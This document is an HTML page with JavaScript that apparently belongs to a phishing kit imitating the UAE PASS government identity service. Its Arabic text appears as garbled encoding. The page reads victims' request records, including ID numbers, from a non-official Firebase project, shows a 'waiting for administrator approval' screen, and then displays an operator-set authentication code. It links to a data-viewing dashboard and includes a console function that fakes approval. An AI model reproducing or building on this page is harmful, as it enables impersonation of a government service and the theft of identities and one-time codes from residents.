<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - Ø­Ø§Ù„Ø© Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #00ac75;
            --error-color: #ff4757;
            --warning-color: #ff9800;
        }
        
        .auth-result {
            text-align: center;
            padding: 40px 20px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            margin: 20px;
            max-width: 600px;
            width: 100%;
        }
        
        .status-icon {
            font-size: 80px;
            margin-bottom: 30px;
        }
        
        .status-success .status-icon {
            color: var(--success-color);
        }
        
        .status-waiting .status-icon {
            color: var(--warning-color);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .auth-number-display {
            font-size: 3em;
            color: var(--success-color);
            font-weight: bold;
            margin: 30px 0;
            padding: 25px;
            background: #f0fff4;
            border: 2px dashed var(--success-color);
            border-radius: 15px;
            direction: ltr;
            letter-spacing: 5px;
            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .auth-details {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            text-align: right;
            border-right: 4px solid var(--primary-color);
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }
        
        .detail-row:last-child {
            border-bottom: none;
        }
        
        .detail-label {
            color: #666;
            font-weight: bold;
        }
        
        .detail-value {
            color: #333;
            font-family: monospace;
        }
        
        .countdown {
            font-size: 1.2em;
            color: var(--warning-color);
            margin: 20px 0;
            padding: 15px;
            background: #fff8e1;
            border-radius: 10px;
            border: 1px solid #ffecb3;
        }
        
        .action-buttons {
            margin-top: 30px;
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: var(--primary-color);
            color: white;
        }
        
        .btn-success {
            background: var(--success-color);
            color: white;
        }
        
        .btn-warning {
            background: var(--warning-color);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .copy-btn {
            background: #6c757d;
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .copy-btn:hover {
            background: #5a6268;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            z-index: 3000;
            display: none;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .notification-success {
            border-left: 4px solid var(--success-color);
        }
    </style>
</head>
<body>
    <div class="rectangle"></div>
    
    <!-- ØªÙ†Ø¨ÙŠÙ‡Ø§Øª -->
    <div class="notification" id="notification">
        <i class="fas fa-info-circle" id="notificationIcon"></i>
        <div>
            <strong id="notificationTitle"></strong>
            <p id="notificationMessage" style="margin: 5px 0 0 0; font-size: 14px;"></p>
        </div>
        <button onclick="hideNotification()" style="background: none; border: none; cursor: pointer; margin-left: 10px;">
            <i class="fas fa-times"></i>
        </button>
    </div>
    
    <div class="main-wrapper">
        <div class="container">
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    Ø­Ø§Ù„Ø© Ø·Ù„Ø¨ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                </h1>
            </header>
            
            <main class="login-content">
                <div id="authResult" class="auth-result status-waiting">
                    <div class="status-icon">
                        <i class="fas fa-clock"></i>
                    </div>
                    
                    <h2 id="statusTitle">ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„</h2>
                    <p id="statusMessage" style="color: #666; margin: 15px 0;">
                        ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­ ÙˆØ¬Ø§Ø±ÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„
                    </p>
                    
                    <div class="countdown">
                        <i class="fas fa-hourglass-half"></i>
                        <span id="timer">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</span>
                    </div>
                    
                    <div class="auth-details">
                        <h3 style="text-align: center; margin-bottom: 20px; color: #333;">
                            <i class="fas fa-info-circle"></i> ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø·Ù„Ø¨
                        </h3>
                        <div class="detail-row">
                            <span class="detail-label">Ù…Ø¹Ø±Ù Ø§Ù„Ø·Ù„Ø¨:</span>
                            <span class="detail-value" id="recordId">-</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©:</span>
                            <span class="detail-value" id="idNumber">-</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">ÙˆÙ‚Øª Ø§Ù„ØªÙ‚Ø¯ÙŠÙ…:</span>
                            <span class="detail-value" id="timestamp">-</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Ø§Ù„Ø­Ø§Ù„Ø©:</span>
                            <span class="detail-value" id="statusText">Ù…Ø¹Ù„Ù‚</span>
                        </div>
                    </div>
                    
                    <div id="authNumberContainer" style="display: none;">
                        <h3 style="margin: 30px 0 15px 0; color: #333;">
                            <i class="fas fa-key"></i> Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                        </h3>
                        <div class="auth-number-display" id="authNumberDisplay">
                            ----
                        </div>
                        <button class="copy-btn" onclick="copyAuthNumber()">
                            <i class="fas fa-copy"></i> Ù†Ø³Ø® Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                        </button>
                        <p style="font-size: 14px; color: #666; margin-top: 10px;">
                            ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø±Ù‚Ù…: <span id="validityMinutes">5</span> Ø¯Ù‚Ø§Ø¦Ù‚
                        </p>
                    </div>
                    
                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="checkStatus()">
                            <i class="fas fa-sync-alt"></i> ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø©
                        </button>
                        <button class="btn btn-warning" onclick="window.location.href='apply.html'">
                            <i class="fas fa-arrow-right"></i> Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯
                        </button>
                        <button class="btn btn-success" onclick="goToDashboard()" style="display: none;" id="dashboardBtn">
                            <i class="fas fa-tachometer-alt"></i> Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
                        </button>
                    </div>
                </div>
            </main>
            
            <footer class="footer">
                <div class="footer-links">
                    <a href="https://uaepass.ae/support" class="menu-link">Ø§Ù„Ø¯Ø¹Ù…</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/faq" class="menu-link">Ø§Ù„Ø£Ø³Ø¦Ù„Ø© Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/locations" class="menu-link">Ù…ÙˆØ§Ù‚Ø¹ Ù…Ù†Ø§ÙØ° Ø§Ù„Ø®Ø¯Ù…Ø©</a>
                </div>
                
                <div class="copyright">
                    <i class="fas fa-copyright"></i> Ø­Ù‚ÙˆÙ‚ Ø§Ù„Ù†Ø´Ø± Â© 2025 Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø±Ù‚Ù…ÙŠØ© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©.
                </div>
            </footer>
        </div>
    </div>

    <script>
        // ØªÙƒÙˆÙŠÙ† Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAk27c6KL77QbnXa_bNeWzUsBph5o7I9A8",
            authDomain: "uaewep-ce954.firebaseapp.com",
            databaseURL: "https://uaewep-ce954-default-rtdb.firebaseio.com",
            projectId: "uaewep-ce954",
            storageBucket: "uaewep-ce954.firebasestorage.app",
            messagingSenderId: "679277016812",
            appId: "1:679277016812:web:ab78a6d55b4a153b8a97c9",
            measurementId: "G-NE9HXPPM9P"
        };
        
        // ØªÙ‡ÙŠØ¦Ø© Firebase
        let firebaseApp;
        let realtimeDb;
        let recordId = '';
        let authNumber = '';
        let checkInterval;
        
        // Ø¯ÙˆØ§Ù„ Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡Ø§Øª
        function showNotification(title, message, type = 'info') {
            const notification = document.getElementById('notification');
            const icon = document.getElementById('notificationIcon');
            const titleEl = document.getElementById('notificationTitle');
            const messageEl = document.getElementById('notificationMessage');
            
            switch(type) {
                case 'success':
                    icon.className = 'fas fa-check-circle';
                    notification.className = 'notification notification-success';
                    break;
                case 'error':
                    icon.className = 'fas fa-times-circle';
                    notification.className = 'notification notification-error';
                    break;
                case 'info':
                    icon.className = 'fas fa-info-circle';
                    notification.className = 'notification notification-info';
                    break;
            }
            
            titleEl.textContent = title;
            messageEl.textContent = message;
            notification.style.display = 'flex';
            
            setTimeout(hideNotification, 3000);
        }
        
        function hideNotification() {
            document.getElementById('notification').style.display = 'none';
        }
        
        // Ø¯Ø§Ù„Ø© Ù†Ø³Ø® Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
        function copyAuthNumber() {
            const authNumber = document.getElementById('authNumberDisplay').textContent;
            navigator.clipboard.writeText(authNumber).then(() => {
                showNotification('ØªÙ… Ø§Ù„Ù†Ø³Ø®', 'ØªÙ… Ù†Ø³Ø® Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©', 'success');
            });
        }
        
        // ØªÙ‡ÙŠØ¦Ø© Firebase
        async function initializeFirebase() {
            try {
                firebaseApp = firebase.initializeApp(firebaseConfig);
                realtimeDb = firebase.database();
                console.log('âœ… Firebase Ù…Ù‡ÙŠØ¦ ÙÙŠ success.html');
                return true;
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Firebase:', error);
                return false;
            }
        }
        
        // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ø§Ø±Ø§Ù…ØªØ±Ø§Øª URL
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                recordId: params.get('recordId'),
                dbType: params.get('dbType'),
                status: params.get('status'),
                waiting: params.get('waiting') === 'true'
            };
        }
        
        // Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù„Ø¨
        async function checkStatus() {
            if (!recordId) return;
            
            try {
                const recordRef = realtimeDb.ref('auth_requests/' + recordId);
                const snapshot = await recordRef.once('value');
                const data = snapshot.val();
                
                if (data) {
                    updateUI(data);
                    
                    if (data.status === 'approved' && data.authNumber) {
                        // ØªÙˆÙ‚Ù Ø¹Ù† Ø§Ù„ØªØ­Ù‚Ù‚ Ø¹Ù†Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©
                        clearInterval(checkInterval);
                        showNotification('ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©', 'ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­', 'success');
                    }
                }
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø­Ø§Ù„Ø©:', error);
            }
        }
        
        // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        function updateUI(data) {
            document.getElementById('idNumber').textContent = data.idNumber || '-';
            document.getElementById('timestamp').textContent = formatDate(data.timestamp);
            document.getElementById('statusText').textContent = getStatusText(data.status);
            
            if (data.status === 'approved' && data.authNumber) {
                document.getElementById('authResult').className = 'auth-result status-success';
                document.getElementById('authResult').querySelector('.status-icon').innerHTML = '<i class="fas fa-check-circle"></i>';
                document.getElementById('statusTitle').textContent = 'ØªÙ…Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­';
                document.getElementById('statusMessage').textContent = 'ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø·Ù„Ø¨ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„';
                document.getElementById('timer').style.display = 'none';
                
                // Ø¹Ø±Ø¶ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                document.getElementById('authNumberContainer').style.display = 'block';
                document.getElementById('authNumberDisplay').textContent = data.authNumber;
                authNumber = data.authNumber;
                
                // Ø¥Ø®ÙØ§Ø¡ Ø²Ø± Ø§Ù„ØªØ­Ù‚Ù‚ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø²Ø± Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„
                const params = getUrlParams();
                if (!params.waiting) {
                    document.getElementById('dashboardBtn').style.display = 'inline-flex';
                }
                
            } else if (data.status === 'rejected') {
                document.getElementById('authResult').className = 'auth-result status-error';
                document.getElementById('authResult').querySelector('.status-icon').innerHTML = '<i class="fas fa-times-circle"></i>';
                document.getElementById('statusTitle').textContent = 'ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø·Ù„Ø¨';
                document.getElementById('statusMessage').textContent = 'ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„';
                document.getElementById('timer').style.display = 'none';
                clearInterval(checkInterval);
            }
        }
        
        // Ø¯Ø§Ù„Ø© ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„ØªØ§Ø±ÙŠØ®
        function formatDate(isoString) {
            if (!isoString) return '-';
            const date = new Date(isoString);
            return date.toLocaleString('ar-SA', {
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
        
        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù†Øµ Ø§Ù„Ø­Ø§Ù„Ø©
        function getStatusText(status) {
            const statusMap = {
                'pending': 'Ù…Ø¹Ù„Ù‚',
                'approved': 'Ù…Ù‚Ø¨ÙˆÙ„',
                'rejected': 'Ù…Ø±ÙÙˆØ¶',
                'expired': 'Ù…Ù†ØªÙ‡ÙŠ'
            };
            return statusMap[status] || status;
        }
        
        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
        function goToDashboard() {
            window.location.href = 'view-data.html';
        }
        
        // Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        function startCountdown() {
            let seconds = 0;
            setInterval(() => {
                seconds++;
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                document.getElementById('timer').textContent = 
                    `Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±: ${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
            }, 1000);
        }
        
        // Ø§Ù„ØªÙ‡ÙŠØ¦Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('DOMContentLoaded', async function() {
            console.log('ğŸ“„ ØµÙØ­Ø© success.html Ù…Ø­Ù…Ù„Ø©');
            
            // ØªÙ‡ÙŠØ¦Ø© Firebase
            const firebaseInitialized = await initializeFirebase();
            if (!firebaseInitialized) {
                showNotification('Ø®Ø·Ø£', 'ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…', 'error');
                return;
            }
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¨Ø§Ø±Ø§Ù…ØªØ±Ø§Øª URL
            const params = getUrlParams();
            recordId = params.recordId;
            
            if (!recordId) {
                document.getElementById('statusTitle').textContent = 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø·Ù„Ø¨';
                document.getElementById('statusMessage').textContent = 'Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù Ø§Ù„Ø·Ù„Ø¨';
                return;
            }
            
            document.getElementById('recordId').textContent = recordId;
            
            // ØªØ­Ù‚Ù‚ ÙÙˆØ±ÙŠ Ù…Ù† Ø§Ù„Ø­Ø§Ù„Ø©
            await checkStatus();
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¯ÙˆØ±ÙŠ ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
            checkInterval = setInterval(checkStatus, 5000);
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
            startCountdown();
            
            // Ø¥Ø®ÙØ§Ø¡ Ø²Ø± Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù†ØªØ¸Ø±Ø§Ù‹
            if (params.waiting) {
                document.getElementById('dashboardBtn').style.display = 'none';
            }
        });
        
        // Ø¯ÙˆØ§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù…Ù† ÙˆØ­Ø¯Ø© Ø§Ù„ØªØ­ÙƒÙ…
        window.simulateApproval = async function() {
            if (!recordId) {
                console.error('âŒ Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¹Ø±Ù Ø³Ø¬Ù„');
                return;
            }
            
            const authNumber = Math.floor(100000 + Math.random() * 900000).toString();
            const recordRef = realtimeDb.ref('auth_requests/' + recordId);
            
            try {
                await recordRef.update({
                    status: 'approved',
                    authNumber: authNumber,
                    approvedAt: new Date().toISOString(),
                    approvedBy: 'admin'
                });
                
                console.log('âœ… ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø·Ù„Ø¨:', { recordId, authNumber });
                showNotification('Ø§Ø®ØªØ¨Ø§Ø±', 'ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø·Ù„Ø¨ ØªØ¬Ø±ÙŠØ¨ÙŠØ§Ù‹', 'success');
                
                return { recordId, authNumber };
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©:', error);
                return { error: error.message };
            }
        };
        
        window.getCurrentRecord = async function() {
            if (!recordId) {
                console.error('âŒ Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¹Ø±Ù Ø³Ø¬Ù„');
                return null;
            }
            
            const recordRef = realtimeDb.ref('auth_requests/' + recordId);
            const snapshot = await recordRef.once('value');
            return snapshot.val();
        };
    </script>
</body>
</html>
